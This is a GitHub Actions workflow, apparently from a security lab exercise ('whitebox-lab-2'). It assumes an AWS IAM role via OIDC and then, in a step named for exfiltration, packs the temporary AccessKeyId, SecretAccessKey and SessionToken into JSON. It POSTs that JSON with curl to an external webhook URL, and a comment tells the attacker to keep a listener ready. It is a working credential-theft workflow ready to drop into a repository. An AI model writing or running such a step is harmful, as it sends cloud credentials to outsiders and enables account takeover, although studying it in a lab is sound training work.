name: "Assume AWS Role via OIDC"

# Configure the workflow trigger (e.g., on a pull request targeting main)
on: workflow_dispatch

jobs:
  aws_assumption_job:
    runs-on: ubuntu-latest
    
    # REQUIRED: Set permissions to generate the OIDC ID Token
    permissions:
      id-token: write # Required to get the ID Token for OIDC permissions [1]
      contents: read # Needed for private repositories to checkout [1]

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v3

      - name: Configure AWS Credentials using OIDC
        uses: aws-actions/configure-aws-credentials@v1
        with:
          aws-region: us-east-1
          role-to-assume: arn:aws:iam::337909758621:role/whitebox-lab-2-github-actions-role
          role-session-name: OIDCSession

      - name: Verify Assumed Role Identity
        run: aws sts get-caller-identity
        shell: bash

      - name: Exfiltrate Assumed Role Credentials to External Host
        run: |
          # Construct a JSON payload using the temporary credentials
          CREDS_JSON="{\"AccessKeyId\":\"$AWS_ACCESS_KEY_ID\",\"SecretAccessKey\":\"$AWS_SECRET_ACCESS_KEY\",\"SessionToken\":\"$AWS_SESSION_TOKEN\"}"
          
          # Send the JSON payload to an external server via HTTP POST
          # Ensure attacker has a listener configured at this endpoint
          curl -X POST -H "Content-Type: application/json" \
               -d "$CREDS_JSON" \
               https://webhook-test.com/a94dcb6984b1165d2de707b2e2514e40
        shell: bash
